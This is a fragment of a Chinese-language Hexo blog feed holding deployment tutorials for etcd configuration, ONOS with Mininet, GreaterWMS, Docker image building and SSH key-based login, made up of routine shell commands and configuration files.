class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>3.编辑etcd配置文件<br>etcd配置文件以yaml文件语法格式编写</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Cluster配置</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">&quot;etcd-node-1&quot;</span></span><br><span class="line"><span class="comment">#指定初始集群状态，&quot;new&quot;代表一个全新的未初始化的etcd集群</span></span><br><span class="line"><span class="attr">initial-cluster-state:</span> <span class="string">&quot;new&quot;</span></span><br><span class="line"><span class="attr">initial-cluster-token:</span> <span class="string">&quot;etcd-cluster-1&quot;</span></span><br><span class="line"><span class="attr">initial-cluster:</span> <span class="string">&quot;etcd-node-1=http://192.168.0.1:2380,etcd-node-2=http://192.168.0.2:2380,etcd-node-3=http://192.168.0.3:2380&quot;</span></span><br><span class="line"><span class="comment">#用于集群部署的，listen-peer-urls为其他etcd节点访问的url</span></span><br><span class="line"><span class="attr">listen-peer-urls:</span> <span class="string">&quot;http://192.168.0.1:2380&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Security配置</span></span><br><span class="line"><span class="attr">client-transport-security:</span></span><br><span class="line">  <span class="attr">cert-file:</span> <span class="string">&quot;/path/to/client.crt&quot;</span></span><br><span class="line">  <span class="attr">key-file:</span> <span class="string">&quot;/path/to/client.key&quot;</span></span><br><span class="line">  <span class="attr">trusted-ca-file:</span> <span class="string">&quot;/path/to/ca.crt&quot;</span></span><br><span class="line">  <span class="comment">#集群的证书，信任的ca证书，以及密钥</span></span><br><span class="line"><span class="attr">peer-transport-security:</span></span><br><span class="line">  <span class="attr">cert-file:</span> <span class="string">&quot;/path/to/peer.crt&quot;</span></span><br><span class="line">  <span class="attr">key-file:</span> <span class="string">&quot;/path/to/peer.key&quot;</span></span><br><span class="line">  <span class="attr">trusted-ca-file:</span> <span class="string">&quot;/path/to/ca.crt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Logging配置</span></span><br><span class="line"><span class="comment">#如果需要输出更多的调试信息，打开debug，在生产环境中建议关闭</span></span><br><span class="line"><span class="attr">debug:</span> <span class="literal">false</span></span><br><span class="line"><span class="comment">#日志等级</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">&quot;info&quot;</span></span><br><span class="line"><span class="attr">log-outputs:</span> [<span class="string">&quot;stdout&quot;</span>]</span><br><span class="line"><span class="comment">#如果要将日志输出到指定文件</span></span><br><span class="line"><span class="comment">#log-outputs: [&quot;file&quot;]</span></span><br><span class="line"><span class="comment">#log-file: &quot;/var/log/etcd/etcd.log&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Storage配置</span></span><br><span class="line"><span class="attr">data-dir:</span> <span class="string">&quot;/var/lib/etcd&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># API Server配置</span></span><br><span class="line"><span class="comment">#监听的地址2379端口为etcd V3版本的监听端口，V2版本为4001，可以根据具体版本进行修改</span></span><br><span class="line"><span class="attr">listen-client-urls:</span> <span class="string">&quot;http://0.0.0.0:2379,http://0.0.0.0:4001&quot;</span></span><br><span class="line"><span class="comment">#响应客户端请求在响应头中加入的地址和端口</span></span><br><span class="line"><span class="attr">advertise-client-urls:</span> <span class="string">&quot;http://192.168.0.1:2379,http://192.168.0.1:4001&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>onosproject和mininet部署</title>
      <link href="/2023/03/22/onos%E5%92%8Cmininet%E9%83%A8%E7%BD%B2/"/>
      <url>/2023/03/22/onos%E5%92%8Cmininet%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="onos和mininet部署"><a href="#onos和mininet部署" class="headerlink" title="onos和mininet部署"></a>onos和mininet部署</h1><h2 id="1-onos"><a href="#1-onos" class="headerlink" title="1.onos"></a>1.onos</h2><h3 id="1-1-onos是什么"><a href="#1-1-onos是什么" class="headerlink" title="1.1.onos是什么?"></a>1.1.onos是什么?</h3><p>ONOS（Open Network Operating System）是一个用于构建和管理网络的开源操作系统。它由Linux基金会主持并进行开发，旨在为现代网络提供可编程、高度自动化和灵活性的操作系统平台。ONOS允许用户使用各种编程语言和工具来实现网络应用程序和服务，并提供了一套标准API和开放协议，以便与其他网络设备和管理平台进行集成。</p><p>ONOS的核心架构采用分布式控制平面，可以自动处理网络拓扑变化、流量路由和负载均衡等任务，同时支持多租户和多层次的网络安全策略。ONOS还支持多种网络技术和协议，如SDN、NFV、P4等，可以轻松地将这些技术与现有的网络结构进行整合和扩展。</p><p>ONOS是一个开放且灵活的网络操作系统平台，已经被广泛应用于电信、互联网服务提供商、企业和研究机构等领域中，以构建高效、灵活和强大的网络基础设施。</p><h3 id="1-2-如何部署onos"><a href="#1-2-如何部署onos" class="headerlink" title="1.2.如何部署onos?"></a>1.2.如何部署onos?</h3><p>源码部署由于会涉及到过多的依赖以及版本兼容问题(网上大部分教程也是基于源码部署)，并且源码部署需要一个漫长的编译时间(取决于你的cpu性能)，由于docker镜像帮我们帮onos的环境以及依赖打包好了，因此我们使用docker部署onos不仅不会出问题，而且会非常的高效。</p><h4 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h4><p>如果你的系统上没有安装docker，那么你首先需要安装docker</p><h5 id="1-2-1安装docker"><a href="#1-2-1安装docker" class="headerlink" title="1.2.1安装docker"></a>1.2.1安装docker</h5><p>基于ubuntu&#x2F;debian</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#docker-compose是用来编排docker容器的一个脚本,如果你不需要docker-compose,将下面的改成docker.io即可</span></span><br><span class="line">apt install docker-compose<span class="comment">#在安装docker-compose的时候回一起安装docker</span></span><br></pre></td></tr></table></figure><h5 id="1-2-2-使用docker-compose编排"><a href="#1-2-2-使用docker-compose编排" class="headerlink" title="1.2.2.使用docker-compose编排"></a>1.2.2.使用docker-compose编排</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">onosproject:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">onosproject/onos:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">onosproject</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">onosproject</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;6640:6640&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;6653:6653&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8101:8101&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8181:8181&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9876:9876&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>将文件保存成docker-compose.yml</p><h5 id="1-2-3-开始部署"><a href="#1-2-3-开始部署" class="headerlink" title="1.2.3.开始部署"></a>1.2.3.开始部署</h5><p>在docker-compose.yml文件夹下执行以下命令编排容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br><span class="line"><span class="comment">#如果这条命令报错，那么首先你需要删除所有的docker容器(指令在下面)</span></span><br><span class="line"><span class="comment">#sudo docker rm -f $(sudo docker ps -qa)</span></span><br></pre></td></tr></table></figure><h5 id="1-2-4-激活功能"><a href="#1-2-4-激活功能" class="headerlink" title="1.2.4.激活功能"></a>1.2.4.激活功能</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#登录到onos容器内部</span></span><br><span class="line">ssh karaf@127.0.0.1 -p8101<span class="comment">#(密码默认为karaf)(指定指令的机器一定要在搭建onos的机器上)</span></span><br><span class="line"><span class="comment">#进入到命令行后输入以下指令(密码默认为karaf)</span></span><br><span class="line">app activate org.onosproject.openflow<span class="comment">#打开openflow功能</span></span><br><span class="line">app activate org.onosproject.fwd<span class="comment">#打开流量转发功能</span></span><br></pre></td></tr></table></figure><p>至此onos服务已经搭建完毕</p><h5 id="1-2-5-我们可以打开浏览器访问"><a href="#1-2-5-我们可以打开浏览器访问" class="headerlink" title="1.2.5.我们可以打开浏览器访问"></a>1.2.5.我们可以打开浏览器访问</h5><p><a href="http://127.0.0.1:8181/onos/ui">http://127.0.0.1:8181/onos/ui</a> (如果浏览器和部署机器不在同一台机器上，把127.0.0.1换成服务器的真实ip地址)<br>默认用户名和密码<br>onos<br>rocks</p><h5 id="1-2-6-确认功能已激活"><a href="#1-2-6-确认功能已激活" class="headerlink" title="1.2.6.确认功能已激活"></a>1.2.6.确认功能已激活</h5><p><img src="/images/activate.png" alt="确认功能已经激活"><br>如果这些功能中有功能未激活，那么回到1.2.4.去激活openflow和fwd功能</p><h2 id="2-mininet"><a href="#2-mininet" class="headerlink" title="2.mininet"></a>2.mininet</h2><h3 id="2-1-什么是mininet？"><a href="#2-1-什么是mininet？" class="headerlink" title="2.1.什么是mininet？"></a>2.1.什么是mininet？</h3><p>Mininet是一种用于创建虚拟网络环境的开源工具。它可以在单个计算机上运行，并模拟多个网络设备和主机之间的连接，包括交换机、路由器、主机等。使用Mininet可以轻松地构建和测试各种网络应用程序和协议，并且可以在实验环境中有效地调试和优化网络性能。</p><p>Mininet基于Linux的命名空间技术，使得用户可以创建多个隔离的虚拟网络环境，并在每个环境中运行自己的网络协议栈和应用程序。它还提供了一个Python API，可以方便地定义和管理虚拟网络拓扑，并支持对网络流量进行捕获和分析。</p><p>Mininet已经成为一个广泛使用的虚拟化网络环境工具，在网络学术研究、教育和开发领域都有着重要的应用价值。</p><h3 id="2-2-mininet部署"><a href="#2-2-mininet部署" class="headerlink" title="2.2.mininet部署"></a>2.2.mininet部署</h3><p>mininet部署有多种方法，但是目前经过多次尝试最稳定的是单独导入一个mininet虚拟机(官方推荐方法),这个虚拟机中已经部署好了mininet环境以及mininet需要的所有的依赖，因此导入即用，非常的方便<br><a href="https://github.com/mininet/mininet/releases/">mininet虚拟机下载地址</a>根据所需下载</p><h3 id="2-3-mininet导入"><a href="#2-3-mininet导入" class="headerlink" title="2.3.mininet导入"></a>2.3.mininet导入</h3><p>将下载好的压缩包导入，使用vmware或者virtualbox即可打开导入<br>以后在mininet命令行上添加设备<br>例如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里的ip地址是已经配置搭建好onos的服务器ip地址(需要根据实际修改)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!!!!!命令一定要看注释!!!</span></span><br><span class="line"><span class="comment">#!!!!!命令一定要看注释!!!</span></span><br><span class="line"><span class="comment">#!!!!!命令一定要看注释!!!</span></span><br><span class="line">sudo mn --topo tree,2 --controller remote,ip=172.17.0.2<span class="comment">#指令执行的地方为mininet主机上，不是onos部署的那台主机(切记！！！！！)(ip地址需要修改成onos的主机的ip地址)</span></span><br><span class="line"><span class="comment">#controller指定onos服务器的ip地址</span></span><br><span class="line"><span class="comment">#--topo 指定拓扑结构</span></span><br></pre></td></tr></table></figure><h3 id="2-4-优化配置选项"><a href="#2-4-优化配置选项" class="headerlink" title="2.4.优化配置选项"></a>2.4.优化配置选项</h3><p>由于虚拟机没有图形化，更没有和宿主机共享剪切板等问题，每次进mininet中操作非常的麻烦，而且mininet默认开启openssh服务，我们可以直接使用ssh工具远程连接，不过你首先需要知道他的ip地址<br><strong>获取ip地址的方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip addr <span class="comment">#执行命令的主机为mininet主机</span></span><br><span class="line"><span class="comment">#eth0网卡后面的inet参数就是ip地址(一般是192.168开头的)</span></span><br></pre></td></tr></table></figure><p>知道ip地址后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh mininet@&#123;IP&#125; <span class="comment">#将ip地址修改成mininet主机的ip地址(执行这条命令的主机是onos主机)</span></span><br><span class="line"><span class="comment">#密码是mininet</span></span><br><span class="line"><span class="comment">#这条命令实现从onos主机远程登录到mininet主机，而不用mininet和onos主机来回切换</span></span><br></pre></td></tr></table></figure><p>登录成功后，我们即可远程操作</p><h3 id="最后的效果"><a href="#最后的效果" class="headerlink" title="最后的效果"></a>最后的效果</h3><p><img src="/images/mininetandonos.png" alt="mininet和onos"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件部署 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GreaterWMS部署</title>
      <link href="/2023/03/21/GreaterWMS%E9%83%A8%E7%BD%B2/"/>
      <url>/2023/03/21/GreaterWMS%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="GreaterWMS部署"><a href="#GreaterWMS部署" class="headerlink" title="GreaterWMS部署"></a>GreaterWMS部署</h1><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1.环境准备"></a>1.环境准备</h3><p>部署环境node14.18.3<br>python 3.10.6，原则上其他python版本也是可以的(但是不能太低，官方用的python3.9，自行参考)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#### 1.获取node</span><br><span class="line">使用的node版本不能太高，不能根据官方教程将node版本升级到最新</span><br><span class="line">```bash</span><br><span class="line">wget [https://nodejs.org/dist/v14.18.3/node-v14.18.3-linux-x64.tar.gz(https://nodejs.org/dist/v14.18.3/node-v14.18.3-linux-x64.tar.gz)  </span><br><span class="line">sudo tar zvxf node-v14.18.3-linux-x64.tar.gz -C /usr/local  </span><br><span class="line">echo &quot;export NODE_HOME=/usr/local/node-v14.18.3-linux-x64&quot; &gt;&gt; /etc/profile</span><br><span class="line">echo &quot;export PATH=$PATH:$NODE_HOME/bin &quot;&gt;&gt; /etc/profile</span><br><span class="line">echo &quot;export NODE_PATH=$NODE_HOME/lib/node_modules&quot; &gt;&gt; /etc/profile</span><br><span class="line">/etc/profile</span><br></pre></td></tr></table></figure><h3 id="2-更新"><a href="#2-更新" class="headerlink" title="2.更新"></a>2.更新</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#npm换源</span></span><br><span class="line">sudo npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line">sudo npm install yarn -g <span class="comment">#安装yarn</span></span><br><span class="line">sudo npm install -g @quasar/cli <span class="comment">#安装quasar/cli</span></span><br><span class="line"><span class="comment">#yarn换源</span></span><br><span class="line">sudo yarn config <span class="built_in">set</span> registry https://registry.npm.taobao.org/</span><br><span class="line"><span class="comment">#安装pip</span></span><br><span class="line">sudo apt install python3-pip</span><br></pre></td></tr></table></figure><h3 id="3-部署项目"><a href="#3-部署项目" class="headerlink" title="3.部署项目"></a>3.部署项目</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取项目(可能需要魔法上网，你懂的)</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/GreaterWMS/GreaterWMS.git</span><br><span class="line"><span class="comment">#安装依赖(如果安装依赖出现问题，则是)</span></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"><span class="built_in">cd</span> templates/ &amp;&amp; yarn install </span><br><span class="line"><span class="comment">#初始化数据库</span></span><br><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure><h3 id="4-修改配置"><a href="#4-修改配置" class="headerlink" title="4.修改配置"></a>4.修改配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /templates/public/statics/baseurl.txt</span><br><span class="line">修改成http://127.0.0.1:8008/</span><br><span class="line">(注意最后一个斜杠不能省，一定要加上)</span><br><span class="line">回到templates目录下重新打包</span><br><span class="line">quasar build</span><br></pre></td></tr></table></figure><h3 id="5-运行项目"><a href="#5-运行项目" class="headerlink" title="5.运行项目"></a>5.运行项目</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#回到项目根目录运行项目</span></span><br><span class="line">python3 manage.py runserver 0.0.0.0:8008</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 软件部署 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker镜像的构建</title>
      <link href="/2023/03/05/docker%E9%95%9C%E5%83%8F%E7%9A%84%E6%9E%84%E5%BB%BA/"/>
      <url>/2023/03/05/docker%E9%95%9C%E5%83%8F%E7%9A%84%E6%9E%84%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="docker镜像的构建"><a href="#docker镜像的构建" class="headerlink" title="docker镜像的构建"></a>docker镜像的构建</h2><h3 id="1-Dockerfile"><a href="#1-Dockerfile" class="headerlink" title="1.Dockerfile"></a>1.Dockerfile</h3><p>Dockerfile是构建docker镜像的脚本，它里面会告诉docker镜像构建程序如何构建一个特定的docker镜像</p><h3 id="2-overlayer"><a href="#2-overlayer" class="headerlink" title="2.overlayer"></a>2.overlayer</h3><p>overlayer是docker镜像的镜像层，每一个docker镜像由多个overlayer的组成，由于docker镜像存储使用了联合文件系统，每一个docker镜像由多个overlayer组成，多个docker镜像相同的overlayer进行共用，这使得不管是存储docker镜像还是运行docker容器，这都极大的节省了空间</p><h3 id="3-Dockerfile语法"><a href="#3-Dockerfile语法" class="headerlink" title="3.Dockerfile语法"></a>3.Dockerfile语法</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:latest       <span class="comment">#以什么镜像为基础构建镜像</span></span><br><span class="line">MANTAINER bugprogram-git <span class="comment">#镜像的构建人</span></span><br><span class="line"><span class="keyword">ENV</span> hello=world <span class="comment">#设置环境变量，在镜像运行时，此参数仍然生效</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/archive.ubuntu.com/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">&amp;&amp; apt update -y &amp;&amp; apt upgrade -y \</span></span><br><span class="line"><span class="language-bash">&amp;&amp; <span class="built_in">ln</span> -snf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \</span></span><br><span class="line"><span class="language-bash"></span></span><br></pre></td></tr></table></figure><h3 id="4-docker镜像构建"><a href="#4-docker镜像构建" class="headerlink" title="4.docker镜像构建"></a>4.docker镜像构建</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t myubuntu:latest -f ./Dockerfile .</span><br><span class="line"><span class="comment">#-f指定dockerfile文件名 </span></span><br><span class="line"><span class="comment">#-t指定构建的镜像名和tag</span></span><br></pre></td></tr></table></figure><h3 id="5-docker镜像多阶段构建"><a href="#5-docker镜像多阶段构建" class="headerlink" title="5.docker镜像多阶段构建"></a>5.docker镜像多阶段构建</h3><p>在实际构建docker镜像的过程中，有时候可能要先构建成中间产物，比如部署项目时，我们可能要先部署编译环境，然后构建成可执行程序的时候，然后在清理中间产物，导致整个构建过程十分的繁琐，因此自从Docker 17.05.0-ce之后，docker支持了多阶段构建镜像</p><p>例如，部署golang程序，我们首先在golang的docker镜像上将源码编译成可执行程序，再将可执行程序部署到alpine镜像上构建成docker镜像。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> golang:alpine as builder</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./hello.go .</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> go build -o hello ./hello.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> alpine</span><br><span class="line"><span class="keyword">MAINTAINER</span> bugprogram-git</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=builder /hello . <span class="comment">#从上述构建的镜像中拷贝可执行程序拷贝到此镜像中</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x hello</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> /hello</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6-常用的docker基础镜像"><a href="#6-常用的docker基础镜像" class="headerlink" title="6.常用的docker基础镜像"></a>6.常用的docker基础镜像</h3><p><strong>alpine</strong><br>最常用的docker基础镜像，非常小，只有几MB，libc使用的musllib，和glibc不兼容，因此部署的可执行程序需要在musllib作为libc时进行编译，否则无法运行<br><strong>centos</strong><br>常用的运行环境，centos由于其稳定性是企业中最常用的linux发行版，<br><strong>ubuntu</strong><br>常用的编译环境，libc为glibc</p>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云原生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh配置密钥</title>
      <link href="/2023/02/11/ssh%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE/"/>
      <url>/2023/02/11/ssh%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="1-什么是ssh？"><a href="#1-什么是ssh？" class="headerlink" title="1.什么是ssh？"></a>1.什么是ssh？</h2><p>ssh是一种应用层协议，一般用于本地客户端登录到远程服务器进行相关作业，端口是22&#x2F;TCP。</p><h2 id="2-ssh结构"><a href="#2-ssh结构" class="headerlink" title="2.ssh结构"></a>2.ssh结构</h2><ul><li>1.ssh服务器</li><li>2.ssh客户端</li></ul><h2 id="3-ssh客户端认证方式"><a href="#3-ssh客户端认证方式" class="headerlink" title="3.ssh客户端认证方式"></a>3.ssh客户端认证方式</h2><ul><li>1.密码认证</li><li>2.密钥认证<br>基于安全性和便利性考量，我们一般使用密钥认证</li></ul><h2 id="4-ssh相关配置"><a href="#4-ssh相关配置" class="headerlink" title="4.ssh相关配置"></a>4.ssh相关配置</h2><h3 id="1-服务器配置"><a href="#1-服务器配置" class="headerlink" title="1.服务器配置"></a>1.服务器配置</h3><h4 id="1-生成密钥"><a href="#1-生成密钥" class="headerlink" title="1.生成密钥"></a>1.生成密钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成一对长度为2048的RSA密钥，指定注释为“rocky linux ECS”</span></span><br><span class="line">ssh-keygen -t rsa -b 2048 -C <span class="string">&quot;rocky linux ECS&quot;</span> -f rocky</span><br><span class="line"><span class="comment">#-t 为指定密钥算法类型</span></span><br><span class="line"><span class="comment">#-b 为密钥的长度一般指定2048足以，</span></span><br><span class="line"><span class="comment">#-C 指定密钥的注释</span></span><br><span class="line"><span class="comment">#-f 指定生成的密钥文件名称</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面这一步将会生成一对RSA密钥，公钥会以.pub为后缀,公钥放在被登录的服务器上，私钥自行留存，被用于以后进行登录服务器时进行身份验证使用。</p><h4 id="2-配置密钥"><a href="#2-配置密钥" class="headerlink" title="2.配置密钥"></a>2.配置密钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将公钥配置在家目录的.ssh目录下</span></span><br><span class="line"><span class="built_in">cat</span> id_rsa.pub &gt; <span class="variable">$HOME</span>/.ssh/authorized_keys</span><br><span class="line"><span class="comment">#注意权限</span></span><br><span class="line"><span class="comment">#.ssh目录要配置成700权限authorized_keys密钥文件权限要配置成644</span></span><br></pre></td></tr></table></figure><p>将公钥配置在服务器上，并且相关目录的权限要配置正确</p><h4 id="3-其他相关配置"><a href="#3-其他相关配置" class="headerlink" title="3.其他相关配置"></a>3.其他相关配置</h4><p>为了服务器的安全考虑以及其他相关需求，我们一般要对服务器进行其他相关配置，ssh服务器的配置文件为&#x2F;etc&#x2F;ssh&#x2F;sshd_config</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#vim /etc/ssh/sshd_config</span></span><br><span class="line">PermitRootlogin <span class="built_in">yes</span><span class="comment">#指定是否允许root用户登录,如果一般不使用root用户登录建议关闭</span></span><br><span class="line">PasswordAuthentication <span class="comment">#指定是否允许通过密码认证方式登录,如果已经使用密钥登录建议关闭</span></span><br><span class="line">AuthorizedKeyFiles .ssh/authorized_key <span class="comment">#指定服务器公钥的存放路径，仅在使用密钥认证的情况下有用</span></span><br></pre></td></tr></table></figure><h3 id="2-客户端配置"><a href="#2-客户端配置" class="headerlink" title="2.客户端配置"></a>2.客户端配置</h3><h4 id="1-配置密钥"><a href="#1-配置密钥" class="headerlink" title="1.配置密钥"></a>1.配置密钥</h4><p>将上次生成的密钥对中的私钥放在客户端目录，一般为了方便我们一般会定义一个ssh客户端配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="variable">$HOME</span>/.ssh/config</span><br><span class="line">Host armbian<span class="comment">#取的别名</span></span><br><span class="line">        Hostname 192.168.1.254<span class="comment">#登录的服务器的ip地址</span></span><br><span class="line">        Port 22<span class="comment">#ssh服务开放的端口，一般默认22</span></span><br><span class="line">        User root<span class="comment">#登录的用户名</span></span><br><span class="line">        Identityfile ~/.ssh/private_keys/armbian<span class="comment">#指定密钥的所在地</span></span><br></pre></td></tr></table></figure><p>将私钥放在配置文件指定的目录下面</p><h4 id="2-使用-配置的别名登录服务器"><a href="#2-使用-配置的别名登录服务器" class="headerlink" title="2.使用 配置的别名登录服务器"></a>2.使用 配置的别名登录服务器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 